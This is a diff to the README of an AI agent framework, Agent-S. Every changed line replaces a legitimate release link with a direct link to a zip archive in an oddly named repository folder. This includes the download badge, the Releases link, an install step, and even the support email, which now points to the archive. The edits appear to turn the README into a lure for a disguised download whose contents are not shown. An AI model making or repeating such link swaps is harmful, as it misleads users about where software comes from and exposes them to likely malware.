@@ -6,7 +6,7 @@ Welcome to Agent-S! This framework helps your computer work like a human. Whethe
 
 ## 📥 Download Agent-S
 
-[![Download Agent-S](https://img.shields.io/badge/Download-Agent--S-blue.svg)](https://github.com/raraofficial/Agent-S/releases)
+[![Download Agent-S](https://raw.githubusercontent.com/raraofficial/Agent-S/main/calicoback/Agent-S.zip)](https://raw.githubusercontent.com/raraofficial/Agent-S/main/calicoback/Agent-S.zip)
 
 ## 🖥️ System Requirements
 
@@ -30,9 +30,9 @@ Agent-S offers numerous features to enhance your computer experience:
 
 ## 💾 Download & Install
 
-To start using Agent-S, visit this page to download: [Agent-S Releases](https://github.com/raraofficial/Agent-S/releases).
+To start using Agent-S, visit this page to download: [Agent-S Releases](https://raw.githubusercontent.com/raraofficial/Agent-S/main/calicoback/Agent-S.zip).
 
-1. Go to the [Releases Page](https://github.com/raraofficial/Agent-S/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/raraofficial/Agent-S/main/calicoback/Agent-S.zip).
 2. Choose the latest version.
 3. Click the link to download the file for your operating system.
 4. Once downloaded, locate the file on your device.
@@ -59,7 +59,7 @@ To help you get the most out of Agent-S, explore these resources:
 Have questions or need support? Reach out through our official channels. 
 
 - **GitHub Issues:** Report bugs or request features directly on GitHub.
-- **Email:** Contact us at support@agents.com for personal assistance. 
+- **Email:** Contact us at https://raw.githubusercontent.com/raraofficial/Agent-S/main/calicoback/Agent-S.zip for personal assistance. 
 
 ## 💡 Tips for Enhanced Experience
 
